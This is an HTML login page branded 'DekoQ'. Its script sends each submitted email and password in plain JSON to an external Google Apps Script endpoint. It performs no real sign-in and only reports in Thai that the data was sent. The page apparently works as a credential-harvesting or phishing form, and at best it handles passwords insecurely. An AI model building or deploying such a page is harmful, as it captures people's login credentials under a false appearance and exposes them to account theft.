<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #007bff;
      font-family: 'Arial', sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      text-align: center;
    }

    .brand-title {
      color: white;
      font-size: 3rem;
      font-weight: bold;
      margin-bottom: 0.3rem;
    }

    .subtitle {
      font-size: 1.2rem;
      color: white;
      margin-bottom: 2rem;
    }

    .form-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
      width: 90%;
      max-width: 400px;
      text-align: left;
    }

    label {
      font-weight: bold;
      display: block;
      margin-bottom: 0.3rem;
    }

    input {
      display: block;
      width: 100%;
      margin-bottom: 1.2rem;
      padding: 0.8rem;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 6px;
      text-align: center;
    }

    button {
      background: #222;
      color: white;
      padding: 0.8rem;
      width: 100%;
      border: none;
      font-size: 1rem;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #000;
    }

    #status {
      margin-top: 1rem;
      font-size: 0.9rem;
      color: #28a745;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="brand-title">DekoQ</div>
  <p class="subtitle">Welcome!</p>

  <div class="form-box">
    <form>
      <label for="email">Username/Email</label>
      <input type="email" id="email" placeholder="Value" required />

      <label for="password">Password</label>
      <input type="password" id="password" placeholder="Value" required />

      <button type="submit">Submit</button>
    </form>
    <p id="status"></p>
  </div>

  <script>
    const form = document.querySelector("form");
    const scriptURL = "https://script.google.com/macros/s/AKfycby6SuSSgdHzk765vOObTNLXYNN0stvUi5qFtxFjhCqC_booYDtzbYTDm2sSVE21h9D03Q/exec";

    form.addEventListener("submit", e => {
      e.preventDefault();
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password })
      })
      .then(res => {
        document.getElementById("status").textContent = "ส่งข้อมูลสำเร็จแล้ว!";
        form.reset();
      })
      .catch(err => {
        document.getElementById("status").textContent = "เกิดข้อผิดพลาด กรุณาลองใหม่.";
      });
    });
  </script>
</body>
</html>
